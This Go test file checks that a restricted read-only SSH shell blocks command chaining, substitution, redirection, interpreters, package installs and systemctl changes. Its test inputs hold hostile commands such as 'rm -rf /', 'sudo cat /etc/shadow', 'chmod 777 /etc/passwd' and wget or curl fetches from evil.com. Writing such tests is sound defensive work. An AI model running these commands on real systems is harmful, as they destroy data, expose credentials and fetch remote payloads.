package readonly

import (
	"os"
	"os/exec"
	"strings"
	"testing"
)

// TestRestrictedShell_CommandChaining tests that the restricted shell properly
// blocks command chaining attempts using various shell metacharacters.
func TestRestrictedShell_CommandChaining(t *testing.T) {
	// Create a temporary shell script file for testing
	tmpfile, err := os.CreateTemp("", "fluid-readonly-shell-test-*.sh")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = os.Remove(tmpfile.Name()) }()

	// Write the restricted shell script
	if _, err := tmpfile.Write([]byte(RestrictedShellScript)); err != nil {
		t.Fatal(err)
	}
	if err := tmpfile.Close(); err != nil {
		t.Fatal(err)
	}

	// Make it executable
	if err := os.Chmod(tmpfile.Name(), 0o755); err != nil {
		t.Fatal(err)
	}

	tests := []struct {
		name        string
		command     string
		shouldBlock bool
		description string
	}{
		// Command chaining attempts that should be blocked
		{
			name:        "semicolon_chaining",
			command:     "cat /etc/hosts; rm -rf /",
			shouldBlock: true,
			description: "semicolon command chaining should be blocked",
		},
		{
			name:        "double_ampersand_chaining",
			command:     "ls /etc && rm -rf /",
			shouldBlock: true,
			description: "&& command chaining should be blocked",
		},
		{
			name:        "double_pipe_chaining",
			command:     "false || rm -rf /",
			shouldBlock: true,
			description: "|| command chaining should be blocked",
		},
		{
			name:        "command_substitution_dollar_paren",
			command:     "echo $(rm -rf /)",
			shouldBlock: true,
			description: "$() command substitution should be blocked",
		},
		{
			name:        "command_substitution_backticks",
			command:     "echo `rm -rf /`",
			shouldBlock: true,
			description: "backtick command substitution should be blocked",
		},
		{
			name:        "process_substitution_input",
			command:     "cat <(rm -rf /)",
			shouldBlock: true,
			description: "<() process substitution should be blocked",
		},
		{
			name:        "process_substitution_output",
			command:     "echo hello >(rm -rf /)",
			shouldBlock: true,
			description: ">() process substitution should be blocked",
		},
		// Valid commands that should be allowed
		{
			name:        "simple_cat",
			command:     "cat /etc/hosts",
			shouldBlock: false,
			description: "simple cat command should be allowed",
		},
		{
			name:        "pipe_to_grep",
			command:     "ps aux | grep nginx",
			shouldBlock: false,
			description: "pipe to grep should be allowed",
		},
		{
			name:        "multiple_pipes",
			command:     "cat /etc/hosts | sort | uniq",
			shouldBlock: false,
			description: "multiple pipes should be allowed",
		},
		// Edge cases
		{
			name:        "quoted_semicolon",
			command:     "echo 'hello; world'",
			shouldBlock: false,
			description: "semicolon in quotes should be allowed",
		},
		{
			name:        "semicolon_then_destructive",
			command:     "echo hello; sudo rm -rf /",
			shouldBlock: true,
			description: "semicolon followed by sudo should be blocked",
		},
		{
			name:        "and_then_destructive",
			command:     "true && chmod 777 /etc/passwd",
			shouldBlock: true,
			description: "&& followed by chmod should be blocked",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Execute the shell with SSH_ORIGINAL_COMMAND set
			cmd := exec.Command(tmpfile.Name())
			cmd.Env = append(os.Environ(), "SSH_ORIGINAL_COMMAND="+tt.command)

			output, err := cmd.CombinedOutput()
			exitCode := 0
			if err != nil {
				if exitErr, ok := err.(*exec.ExitError); ok {
					exitCode = exitErr.ExitCode()
				} else {
					t.Fatalf("unexpected error running shell: %v", err)
				}
			}

			if tt.shouldBlock {
				// Command should be blocked (exit code 126 or 1)
				if exitCode == 0 {
					t.Errorf("%s: expected command to be blocked but it succeeded\nCommand: %s\nOutput: %s",
						tt.description, tt.command, output)
				} else if !strings.Contains(string(output), "ERROR:") {
					t.Errorf("%s: command blocked but no error message shown\nCommand: %s\nOutput: %s",
						tt.description, tt.command, output)
				}
			} else {
				// Command should succeed (exit code 0) or fail legitimately (exit code 1)
				// Exit code 126 means blocked by shell, which is incorrect for allowed commands
				if exitCode == 126 {
					t.Errorf("%s: expected command to succeed but it was blocked by shell\nCommand: %s\nOutput: %s",
						tt.description, tt.command, output)
				} else if exitCode != 0 && exitCode != 1 {
					// Any other non-zero exit code is unexpected
					t.Logf("%s: command exited with unexpected code %d (not 0, 1, or 126)\nCommand: %s\nOutput: %s",
						tt.description, exitCode, tt.command, output)
				}
			}
		})
	}
}

// TestRestrictedShell_ComplexBypassAttempts tests more sophisticated attempts
// to bypass the restricted shell restrictions.
func TestRestrictedShell_ComplexBypassAttempts(t *testing.T) {
	tmpfile, err := os.CreateTemp("", "fluid-readonly-shell-test-*.sh")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = os.Remove(tmpfile.Name()) }()

	if _, err := tmpfile.Write([]byte(RestrictedShellScript)); err != nil {
		t.Fatal(err)
	}
	if err := tmpfile.Close(); err != nil {
		t.Fatal(err)
	}

	if err := os.Chmod(tmpfile.Name(), 0o755); err != nil {
		t.Fatal(err)
	}

	tests := []struct {
		name        string
		command     string
		shouldBlock bool
		description string
	}{
		// --- Blocked command after pipe separator ---
		{
			name:        "pipe_to_sudo",
			command:     "echo test | sudo cat /etc/shadow",
			shouldBlock: true,
			description: "blocked command after pipe should be caught per-segment",
		},
		{
			name:        "pipe_to_rm",
			command:     "cat /etc/hosts | rm -rf /tmp/important",
			shouldBlock: true,
			description: "rm after pipe should be caught per-segment",
		},
		// --- Multi-hop chaining ---
		{
			name:        "triple_semicolon_chain",
			command:     "echo a; echo b; rm -rf /",
			shouldBlock: true,
			description: "blocked command at end of multi-semicolon chain",
		},
		{
			name:        "mixed_separators",
			command:     "true && echo ok; false || rm -rf /",
			shouldBlock: true,
			description: "blocked command after mixed && ; || separators",
		},
		{
			name:        "blocked_in_middle_of_chain",
			command:     "echo start; chmod 777 /etc/passwd; echo end",
			shouldBlock: true,
			description: "blocked command in the middle of a chain",
		},
		// --- Whitespace tricks ---
		{
			name:        "extra_spaces_after_separator",
			command:     "ls ;   rm -rf /",
			shouldBlock: true,
			description: "leading whitespace after separator is trimmed before check",
		},
		{
			name:        "tabs_after_separator",
			command:     "ls ;\trm -rf /",
			shouldBlock: true,
			description: "tab whitespace after separator is trimmed before check",
		},
		// --- Command substitution variants ---
		{
			name:        "nested_command_substitution",
			command:     "echo $(echo $(whoami))",
			shouldBlock: true,
			description: "nested $() substitution should be caught",
		},
		{
			name:        "command_substitution_in_argument",
			command:     "ls $(pwd)",
			shouldBlock: true,
			description: "$() in argument position still blocked",
		},
		{
			name:        "multiple_backticks",
			command:     "echo `whoami` `hostname`",
			shouldBlock: true,
			description: "multiple backtick substitutions blocked",
		},
		{
			name:        "command_substitution_no_spaces",
			command:     "echo$(rm /tmp/x)",
			shouldBlock: true,
			description: "$() without preceding space still blocked",
		},
		// --- Process substitution ---
		{
			name:        "diff_with_process_substitution",
			command:     "diff <(cat /etc/hosts) <(cat /etc/passwd)",
			shouldBlock: true,
			description: "process substitution in diff command blocked",
		},
		// --- Output redirection variants ---
		{
			name:        "redirect_stderr",
			command:     "echo hello 2>/dev/null",
			shouldBlock: true,
			description: "stderr redirection blocked by > pattern",
		},
		{
			name:        "append_redirect",
			command:     "echo hello >> /tmp/log",
			shouldBlock: true,
			description: "append redirection blocked",
		},
		{
			name:        "redirect_after_pipe",
			command:     "cat /etc/hosts | sort >> /tmp/sorted",
			shouldBlock: true,
			description: "redirect after pipe blocked",
		},
		// --- Interpreter variants ---
		{
			name:        "python3_explicit",
			command:     "python3 -c 'import os; os.system(\"rm -rf /\")'",
			shouldBlock: true,
			description: "python3 matches ^python prefix pattern",
		},
		{
			name:        "perl_one_liner",
			command:     "perl -e 'system(\"rm -rf /\")'",
			shouldBlock: true,
			description: "perl interpreter blocked",
		},
		{
			name:        "ruby_one_liner",
			command:     "ruby -e 'system(\"rm -rf /\")'",
			shouldBlock: true,
			description: "ruby interpreter blocked",
		},
		{
			name:        "node_eval",
			command:     "node -e 'require(\"child_process\").execSync(\"rm -rf /\")'",
			shouldBlock: true,
			description: "node interpreter blocked",
		},
		// --- Package manager variants ---
		{
			name:        "apt_get_install",
			command:     "apt-get install -y malicious-package",
			shouldBlock: true,
			description: "apt-get install blocked",
		},
		{
			name:        "pip_install",
			command:     "pip install malicious-package",
			shouldBlock: true,
			description: "pip install blocked",
		},
		{
			name:        "pip3_install",
			command:     "pip3 install malicious-package",
			shouldBlock: true,
			description: "pip3 install blocked",
		},
		// --- Systemctl mutation variants ---
		{
			name:        "systemctl_daemon_reload",
			command:     "systemctl daemon-reload",
			shouldBlock: true,
			description: "systemctl daemon-reload matches ^systemctl daemon",
		},
		{
			name:        "systemctl_enable",
			command:     "systemctl enable malicious.service",
			shouldBlock: true,
			description: "systemctl enable blocked",
		},
		{
			name:        "systemctl_mask",
			command:     "systemctl mask sshd",
			shouldBlock: true,
			description: "systemctl mask blocked",
		},
		// --- Chained blocked after allowed ---
		{
			name:        "cat_then_wget",
			command:     "cat /etc/hosts && wget http://evil.com/payload",
			shouldBlock: true,
			description: "wget in second segment blocked",
		},
		{
			name:        "ls_then_curl",
			command:     "ls /tmp; curl http://evil.com/payload",
			shouldBlock: true,
			description: "curl in second segment blocked",
		},
		{
			name:        "or_chain_to_shell",
			command:     "false || sh -c 'whoami'",
			shouldBlock: true,
			description: "sh in || fallback blocked",
		},
		// --- Allowed: read-only commands that look suspicious but are fine ---
		{
			name:        "systemctl_status",
			command:     "systemctl status nginx",
			shouldBlock: false,
			description: "systemctl status is read-only and allowed",
		},
		{
			name:        "systemctl_is_active",
			command:     "systemctl is-active sshd",
			shouldBlock: false,
			description: "systemctl is-active is read-only and allowed",
		},
		{
			name:        "systemctl_list_units",
			command:     "systemctl list-units",
			shouldBlock: false,
			description: "systemctl list-units is read-only and allowed",
		},
		{
			name:        "dpkg_list",
			command:     "dpkg -l",
			shouldBlock: false,
			description: "dpkg -l (list) is read-only and allowed",
		},
		{
			name:        "dpkg_status",
			command:     "dpkg -s openssh-server",
			shouldBlock: false,
			description: "dpkg -s (status) is read-only and allowed",
		},
		{
			name:        "apt_list_installed",
			command:     "apt list --installed",
			shouldBlock: false,
			description: "apt list is read-only and allowed",
		},
		{
			name:        "apt_show",
			command:     "apt show nginx",
			shouldBlock: false,
			description: "apt show is read-only and allowed",
		},
		{
			name:        "complex_pipeline_allowed",
			command:     "ps aux | grep nginx | awk '{print $2}' | head -5",
			shouldBlock: false,
			description: "complex read-only pipeline allowed",
		},
		{
			name:        "double_quoted_separators",
			command:     `echo "hello && world; test || foo"`,
			shouldBlock: false,
			description: "separators inside double quotes are not split on",
		},
		{
			name:        "single_quoted_subshell_pattern",
			command:     "echo 'hello $() > /tmp/test'",
			shouldBlock: true,
			description: "$() pattern blocked even inside quotes (conservative raw-string check)",
		},
		{
			name:        "grep_with_pipe_regex",
			command:     `grep -E "pattern1|pattern2" /etc/hosts`,
			shouldBlock: false,
			description: "pipe in grep regex inside quotes is allowed",
		},
		{
			name:        "sed_read_only",
			command:     "sed -n '1,5p' /etc/hosts",
			shouldBlock: false,
			description: "sed without -i is read-only and allowed",
		},
		{
			name:        "find_read_only",
			command:     "find /etc -name '*.conf' -type f",
			shouldBlock: false,
			description: "find for reading is allowed",
		},
		{
			name:        "journalctl",
			command:     "journalctl -u nginx --no-pager -n 50",
			shouldBlock: false,
			description: "journalctl is read-only and allowed",
		},
		{
			name:        "df_disk_usage",
			command:     "df -h",
			shouldBlock: false,
			description: "df is read-only and allowed",
		},
		{
			name:        "free_memory",
			command:     "free -m",
			shouldBlock: false,
			description: "free is read-only and allowed",
		},
		{
			name:        "quoted_double_ampersand",
			command:     `echo "run this && that"`,
			shouldBlock: false,
			description: "&& inside double quotes is literal",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := exec.Command(tmpfile.Name())
			cmd.Env = append(os.Environ(), "SSH_ORIGINAL_COMMAND="+tt.command)

			output, err := cmd.CombinedOutput()
			exitCode := 0
			if err != nil {
				if exitErr, ok := err.(*exec.ExitError); ok {
					exitCode = exitErr.ExitCode()
				} else {
					t.Fatalf("unexpected error running shell: %v", err)
				}
			}

			if tt.shouldBlock {
				if exitCode == 0 {
					t.Errorf("%s: expected command to be blocked but it succeeded\nCommand: %s\nOutput: %s",
						tt.description, tt.command, output)
				} else if !strings.Contains(string(output), "ERROR:") {
					t.Errorf("%s: command blocked but no error message shown\nCommand: %s\nOutput: %s",
						tt.description, tt.command, output)
				}
			} else {
				if exitCode == 126 {
					t.Errorf("%s: expected command to succeed but it was blocked by shell\nCommand: %s\nOutput: %s",
						tt.description, tt.command, output)
				}
			}
		})
	}
}

// TestRestrictedShell_InteractiveLoginBlocked tests that interactive login
// (without SSH_ORIGINAL_COMMAND) is denied.
func TestRestrictedShell_InteractiveLoginBlocked(t *testing.T) {
	tmpfile, err := os.CreateTemp("", "fluid-readonly-shell-test-*.sh")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = os.Remove(tmpfile.Name()) }()

	if _, err := tmpfile.Write([]byte(RestrictedShellScript)); err != nil {
		t.Fatal(err)
	}
	if err := tmpfile.Close(); err != nil {
		t.Fatal(err)
	}

	if err := os.Chmod(tmpfile.Name(), 0o755); err != nil {
		t.Fatal(err)
	}

	// Execute without SSH_ORIGINAL_COMMAND
	cmd := exec.Command(tmpfile.Name())
	output, err := cmd.CombinedOutput()

	if err == nil {
		t.Error("expected interactive login to be denied")
	}

	if !strings.Contains(string(output), "Interactive login is not permitted") {
		t.Errorf("expected interactive login error message, got: %s", output)
	}
}

// TestRestrictedShell_OutputRedirectionBlocked tests that output redirection
// is properly blocked.
func TestRestrictedShell_OutputRedirectionBlocked(t *testing.T) {
	tmpfile, err := os.CreateTemp("", "fluid-readonly-shell-test-*.sh")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = os.Remove(tmpfile.Name()) }()

	if _, err := tmpfile.Write([]byte(RestrictedShellScript)); err != nil {
		t.Fatal(err)
	}
	if err := tmpfile.Close(); err != nil {
		t.Fatal(err)
	}

	if err := os.Chmod(tmpfile.Name(), 0o755); err != nil {
		t.Fatal(err)
	}

	tests := []struct {
		name    string
		command string
	}{
		{"single_redirect", "echo hello > /tmp/out"},
		{"double_redirect", "echo hello >> /tmp/out"},
		{"redirect_with_pipe", "cat /etc/hosts | sort > /tmp/out"},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			cmd := exec.Command(tmpfile.Name())
			cmd.Env = append(os.Environ(), "SSH_ORIGINAL_COMMAND="+tt.command)

			output, err := cmd.CombinedOutput()
			if err == nil {
				t.Errorf("expected command %q to be blocked", tt.command)
			}

			if !strings.Contains(string(output), "redirection is not permitted") {
				t.Errorf("expected redirection error message for %q, got: %s", tt.command, output)
			}
		})
	}
}

// TestRestrictedShell_LoginShellInvocation tests that the restricted shell
// accepts commands via -c argument (login shell invocation by sshd) in
// addition to SSH_ORIGINAL_COMMAND.
func TestRestrictedShell_LoginShellInvocation(t *testing.T) {
	tmpfile, err := os.CreateTemp("", "fluid-readonly-shell-test-*.sh")
	if err != nil {
		t.Fatal(err)
	}
	defer func() { _ = os.Remove(tmpfile.Name()) }()

	if _, err := tmpfile.Write([]byte(RestrictedShellScript)); err != nil {
		t.Fatal(err)
	}
	if err := tmpfile.Close(); err != nil {
		t.Fatal(err)
	}

	if err := os.Chmod(tmpfile.Name(), 0o755); err != nil {
		t.Fatal(err)
	}

	t.Run("dash_c_allowed_command", func(t *testing.T) {
		cmd := exec.Command(tmpfile.Name(), "-c", "cat /etc/hosts")
		// No SSH_ORIGINAL_COMMAND set
		cmd.Env = []string{"PATH=" + os.Getenv("PATH")}
		output, err := cmd.CombinedOutput()
		exitCode := 0
		if err != nil {
			if exitErr, ok := err.(*exec.ExitError); ok {
				exitCode = exitErr.ExitCode()
			} else {
				t.Fatalf("unexpected error: %v", err)
			}
		}
		if exitCode == 126 || exitCode == 1 {
			t.Errorf("expected allowed command via -c to succeed, got exit=%d output=%s", exitCode, output)
		}
	})

	t.Run("dash_c_blocked_command", func(t *testing.T) {
		cmd := exec.Command(tmpfile.Name(), "-c", "rm -rf /")
		cmd.Env = []string{"PATH=" + os.Getenv("PATH")}
		output, err := cmd.CombinedOutput()
		if err == nil {
			t.Error("expected blocked command via -c to fail")
		}
		if !strings.Contains(string(output), "ERROR:") {
			t.Errorf("expected ERROR message, got: %s", output)
		}
	})

	t.Run("dash_c_empty_command", func(t *testing.T) {
		cmd := exec.Command(tmpfile.Name(), "-c", "")
		cmd.Env = []string{"PATH=" + os.Getenv("PATH")}
		output, err := cmd.CombinedOutput()
		if err == nil {
			t.Error("expected empty -c command to be rejected")
		}
		if !strings.Contains(string(output), "Interactive login is not permitted") {
			t.Errorf("expected interactive login error, got: %s", output)
		}
	})

	t.Run("no_args_no_env", func(t *testing.T) {
		cmd := exec.Command(tmpfile.Name())
		cmd.Env = []string{"PATH=" + os.Getenv("PATH")}
		output, err := cmd.CombinedOutput()
		if err == nil {
			t.Error("expected no-args invocation to be rejected")
		}
		if !strings.Contains(string(output), "Interactive login is not permitted") {
			t.Errorf("expected interactive login error, got: %s", output)
		}
	})

	t.Run("ssh_original_command_takes_precedence", func(t *testing.T) {
		// SSH_ORIGINAL_COMMAND is set to a blocked command, -c has an allowed one.
		// SSH_ORIGINAL_COMMAND should take precedence.
		cmd := exec.Command(tmpfile.Name(), "-c", "cat /etc/hosts")
		cmd.Env = []string{
			"PATH=" + os.Getenv("PATH"),
			"SSH_ORIGINAL_COMMAND=rm -rf /",
		}
		output, err := cmd.CombinedOutput()
		if err == nil {
			t.Error("expected SSH_ORIGINAL_COMMAND to take precedence and block")
		}
		if !strings.Contains(string(output), "ERROR:") {
			t.Errorf("expected ERROR message from blocked SSH_ORIGINAL_COMMAND, got: %s", output)
		}
	})
}
